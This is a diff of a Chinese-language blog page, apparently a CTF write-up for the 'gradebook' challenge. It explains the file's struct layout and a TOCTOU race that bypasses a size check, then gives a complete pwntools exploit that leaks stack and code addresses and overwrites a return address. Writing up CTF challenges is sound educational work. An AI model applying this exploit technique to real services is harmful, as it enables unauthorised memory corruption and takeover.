@@ -90,22 +90,129 @@
 <p><a target="_blank" rel="noopener" href="https://linux.die.net/man/2/fstat">fstat</a> 查看 fd 的信息，返回一个 stat 结构体</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">mmap</a> 将文件内容映射到内存，可以直接通过指针读取而不是 read write</p>
 <h3 id="gradebook-结构"><a href="#gradebook-结构" class="headerlink" title="gradebook 结构"></a>gradebook 结构</h3><p>根据函数 sub_2247 开头的部分可以推测出 gradebook 的结构</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4 year</span><br><span class="line">0x8 grade book name (32 bytes)</span><br><span class="line">0x28 student name (32 bytes)</span><br><span class="line">0x48 size of this gradebook (uint)</span><br><span class="line">0x50 first grade structure offset</span><br><span class="line">0x58 new grade structure offset</span><br></pre></td></tr></table></figure>
-
+<pre><code class="text">0x4 year
+0x8 grade book name (32 bytes)
+0x28 student name (32 bytes)
+0x48 size of this gradebook (uint)
+0x50 first grade structure offset
+0x58 new grade structure offset
+</code></pre>
 <p>每一条记录 grade 是一个大小为 0x40 的结构体</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x0 class</span><br><span class="line">0x8 course title (22 bytes)</span><br><span class="line">0x1e grade (2bytes)</span><br><span class="line">0x20 teacher (12 bytes)</span><br><span class="line">0x2c room</span><br><span class="line">0x30 period</span><br><span class="line">0x38 next structure offset</span><br></pre></td></tr></table></figure>
-
+<pre><code class="text">0x0 class
+0x8 course title (22 bytes)
+0x1e grade (2bytes)
+0x20 teacher (12 bytes)
+0x2c room
+0x30 period
+0x38 next structure offset
+</code></pre>
 <h3 id="toctou"><a href="#toctou" class="headerlink" title="toctou"></a>toctou</h3><p>TOCTOU (Time-of-check to time-of-use) ，先检查后使用描述的是一种文件的操作方式，比如：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> This program has setuid access rights flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">&quot;filePathName&quot;</span>, W_OK))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;filePathName&quot;</span>, O_WRONLY);</span><br><span class="line">write(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br></pre></td></tr></table></figure>
+<pre><code class="c">// NOTE: This program has setuid access rights flag
 
+if (access(&quot;filePathName&quot;, W_OK))
+&#123;
+   exit(EXIT_FAILURE);
+&#125;
+
+fd = open(&quot;filePathName&quot;, O_WRONLY);
+write(fd, buffer, sizeof(buffer));
+</code></pre>
 <p>在一个文件完成检查到使用的时间间隙，文件信息可能被改变。在上面的程序中，<code>access()</code> 这个检查和 <code>open()</code> 这个实际访问操作中可能会有其他（恶意）程序对文件系统进行更改，从而导致恶意访问发生。</p>
 <p>在本题中，一次连接 open file，再有一个新的连接像已经打开的文件 upload 一个新的 gradebook，设置一个很大的 gradebook size （绕过了 buf. st_size 限制）就可以读写指定的地址</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过了以下 check，正常上传的 dradebook 的偏移不会超过 mmap 映射的区域</span></span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)gradebook_addr + <span class="number">9</span>) &gt; len</span><br><span class="line">|| *((_QWORD *)gradebook_addr + <span class="number">11</span>) &gt; *((_QWORD *)gradebook_addr + <span class="number">9</span>)</span><br><span class="line">|| *((_QWORD *)gradebook_addr + <span class="number">11</span>) &lt;= <span class="number">0x5F</span>uLL )</span><br></pre></td></tr></table></figure>
-
+<pre><code class="c">//绕过了以下 check，正常上传的 dradebook 的偏移不会超过 mmap 映射的区域
+if ( *((_QWORD *)gradebook_addr + 9) &gt; len
+|| *((_QWORD *)gradebook_addr + 11) &gt; *((_QWORD *)gradebook_addr + 9)
+|| *((_QWORD *)gradebook_addr + 11) &lt;= 0x5FuLL )
+</code></pre>
 <h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>撕了得了，远程不通感觉栈布局不一样？以及好像也可以爆破 1&#x2F;16 概率的 aslr</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./chal&quot;</span></span><br><span class="line">ip = <span class="string">&quot;gradebook.2023.ctfcompetition.com&quot;</span></span><br><span class="line">port = <span class="string">&quot;1337&quot;</span></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;tmux set mouse on&#x27;</span>)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    p = process(elf_path)</span><br><span class="line">    p_fake = process(elf_path)</span><br><span class="line">    <span class="comment"># p = gdb.debug(elf_path)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    p_fake = remote(ip, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">rx = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload a narmal gradebook</span></span><br><span class="line">sla(<span class="string">b&#x27;PASSWORD:\n&#x27;</span>, <span class="string">b&#x27;pencil&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;3. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ENTER FILENAME:\n&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">rud(<span class="string">b&#x27;GENERATED FILENAME: &#x27;</span>)</span><br><span class="line">file_name = ru(<span class="string">b&#x27;ENTER&#x27;</span>)[:<span class="number">44</span>].decode()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;gradebook&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">file_data = f.read()</span><br><span class="line">sla(<span class="string">b&#x27;FILE SIZE:\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(file_data)).encode())</span><br><span class="line">sa(<span class="string">b&#x27;SEND BINARY FILE DATA:\n&#x27;</span>,  file_data)</span><br><span class="line">sla(<span class="string">b&#x27;3. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ENTER FILENAME:&#x27;</span>, file_name.encode())</span><br><span class="line">log.success(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack_addr</span></span><br><span class="line">sla(<span class="string">b&#x27;6. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;CLASS:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;COURSE TITLE:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;GRADE:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;TEACHER:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ROOM:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;PERIOD:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27; 1111     &#x27;</span>)</span><br><span class="line">ret_addr = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x150</span></span><br><span class="line">leak(<span class="string">&#x27;ret_addr&#x27;</span>, ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak fun_addr</span></span><br><span class="line">grade_book = <span class="number">0x4752ADE50000</span></span><br><span class="line">fake_file = file_data[:<span class="number">0x48</span>]</span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_file += p64(ret_addr - grade_book)</span><br><span class="line">fake_file += p64(ret_addr - grade_book)</span><br><span class="line">p_fake.sendlineafter(<span class="string">b&#x27;PASSWORD:\n&#x27;</span>, <span class="string">b&#x27;pencil&#x27;</span>)</span><br><span class="line">p_fake.sendlineafter(<span class="string">b&#x27;3. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p_fake.sendlineafter(<span class="string">b&#x27;ENTER FILENAME:\n&#x27;</span>, file_name.encode())</span><br><span class="line">p_fake.sendlineafter(<span class="string">b&#x27;ENTER FILE SIZE:\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(fake_file)).encode())</span><br><span class="line">p_fake.sendafter(<span class="string">b&#x27;SEND BINARY FILE DATA:\n&#x27;</span>,  fake_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack_addr</span></span><br><span class="line">sla(<span class="string">b&#x27;6. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;WHICH GRADE:\n&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\x0a   &#x27;</span>)</span><br><span class="line">fun_addr = u64(rud(<span class="string">b&#x27;   &#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;fun_addr&#x27;</span>, fun_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change ret addr</span></span><br><span class="line">sla(<span class="string">b&#x27;6. QUIT\n\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;CLASS:\n&#x27;</span>, p64(fun_addr - <span class="number">0xd95</span>))</span><br><span class="line">sla(<span class="string">b&#x27;COURSE TITLE:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;GRADE:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;TEACHER:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ROOM:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;PERIOD:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+
+elf_path = &quot;./chal&quot;
+ip = &quot;gradebook.2023.ctfcompetition.com&quot;
+port = &quot;1337&quot;
+content = 0
+
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+if content == 1:
+    os.system(&#39;tmux set mouse on&#39;)
+    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+    p = process(elf_path)
+    p_fake = process(elf_path)
+    # p = gdb.debug(elf_path)
+
+else:
+    p = remote(ip, port)
+    p_fake = remote(ip, port)
 
 
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+leak = lambda name,addr :log.success(&#39;&#123;&#125; = &#123;:#x&#125;&#39;.format(name, addr))
+
+# ----------------------------------------------------------
+
+# upload a narmal gradebook
+sla(b&#39;PASSWORD:\n&#39;, b&#39;pencil&#39;)
+sla(b&#39;3. QUIT\n\n&#39;, b&#39;2&#39;)
+sla(b&#39;ENTER FILENAME:\n&#39;, b&#39;x&#39;)
+rud(b&#39;GENERATED FILENAME: &#39;)
+file_name = ru(b&#39;ENTER&#39;)[:44].decode()
+f = open(&quot;gradebook&quot;, &quot;rb&quot;)
+file_data = f.read()
+sla(b&#39;FILE SIZE:\n&#39;, str(len(file_data)).encode())
+sa(b&#39;SEND BINARY FILE DATA:\n&#39;,  file_data)
+sla(b&#39;3. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;ENTER FILENAME:&#39;, file_name.encode())
+log.success(file_name)
+
+# leak stack_addr
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;CLASS:\n&#39;, b&#39;1&#39;)
+sla(b&#39;COURSE TITLE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;GRADE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;TEACHER:\n&#39;, b&#39;1&#39;)
+sla(b&#39;ROOM:\n&#39;, b&#39;1&#39;*4)
+sla(b&#39;PERIOD:\n&#39;, b&#39;1&#39;)
+ru(b&#39; 1111     &#39;)
+ret_addr = u64(ru(b&#39;\x7f&#39;).ljust(8, b&#39;\x00&#39;)) - 0x150
+leak(&#39;ret_addr&#39;, ret_addr)
+
+# leak fun_addr
+grade_book = 0x4752ADE50000
+fake_file = file_data[:0x48]
+fake_file += p64(0xffffffffffffffff)
+fake_file += p64(ret_addr - grade_book)
+fake_file += p64(ret_addr - grade_book)
+p_fake.sendlineafter(b&#39;PASSWORD:\n&#39;, b&#39;pencil&#39;)
+p_fake.sendlineafter(b&#39;3. QUIT\n\n&#39;, b&#39;2&#39;)
+p_fake.sendlineafter(b&#39;ENTER FILENAME:\n&#39;, file_name.encode())
+p_fake.sendlineafter(b&#39;ENTER FILE SIZE:\n&#39;, str(len(fake_file)).encode())
+p_fake.sendafter(b&#39;SEND BINARY FILE DATA:\n&#39;,  fake_file)
+
+# leak stack_addr
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;2&#39;)
+sla(b&#39;WHICH GRADE:\n&#39;, b&#39;0&#39;)
+ru(b&#39;\x0a   &#39;)
+fun_addr = u64(rud(b&#39;   &#39;).ljust(8, b&#39;\x00&#39;))
+leak(&#39;fun_addr&#39;, fun_addr)
+
+# change ret addr
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;CLASS:\n&#39;, p64(fun_addr - 0xd95))
+sla(b&#39;COURSE TITLE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;GRADE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;TEACHER:\n&#39;, b&#39;1&#39;)
+sla(b&#39;ROOM:\n&#39;, b&#39;1&#39;*4)
+sla(b&#39;PERIOD:\n&#39;, b&#39;1&#39;)
+
+p.interactive()
+</code></pre>
 <h2 id="想看"><a href="#想看" class="headerlink" title="想看"></a>想看</h2><p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/08/defcon30quals_constricted/">Defcon-30-Quals rust-pwn constricted</a></p>
 </div>
 </article>
